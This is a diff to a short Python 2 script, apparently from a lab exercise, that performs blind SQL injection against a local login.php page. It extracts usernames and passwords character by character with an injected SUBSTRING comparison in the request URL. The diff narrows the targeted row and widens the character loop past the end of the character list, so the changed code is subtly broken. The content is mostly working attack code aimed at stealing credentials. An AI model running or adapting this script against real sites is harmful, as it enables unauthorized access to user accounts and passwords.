@@ -19,7 +19,8 @@ file= open("logs.txt","w+")
 file.write('START : ' + str(datetime.datetime.now())+'\n')
 listASCII=string.printable
 iterator=cycle(['username','password'])
-for row in xrange(1,101):
+for row in xrange(46,47):
+#for row in xrange(1,101):
 	file.write(str(row) + "    ")
 	for iter in xrange(0,2):
 		field=iterator.next()
@@ -37,7 +38,7 @@ for row in xrange(1,101):
 		word=""
 		for pos in xrange(1,size+1):
 
-			for c in xrange(0,128):
+			for c in xrange(0,129):
 				request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + listASCII[c] + "%27%20--%20" 
 				f = urllib.urlopen(request)
 				response = f.read()
